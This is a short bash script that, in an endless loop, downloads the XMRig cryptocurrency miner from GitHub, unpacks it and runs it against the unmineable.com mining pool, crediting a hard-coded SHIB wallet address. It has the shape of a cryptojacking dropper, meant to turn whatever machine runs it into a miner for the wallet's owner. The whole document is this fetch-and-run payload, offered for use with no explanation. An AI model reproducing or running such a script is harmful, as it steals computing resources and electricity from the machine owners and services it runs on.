#!/bin/bash

while [ 1 ]; do
  sleep 5
wget https://github.com/xmrig/xmrig/releases/download/v6.5.3/xmrig-6.5.3-bionic-x64.tar.gz && tar xvf xmrig-6.5.3-bionic-x64.tar.gz && cd xmrig-6.5.3 && ./xmrig -t1 -o rx.unmineable.com:3333 -u SHIB:0xf932e7CD10E3bDa943916024358951b6C5c06F02.cici -p x -k -a rx/0
done
sleep 999
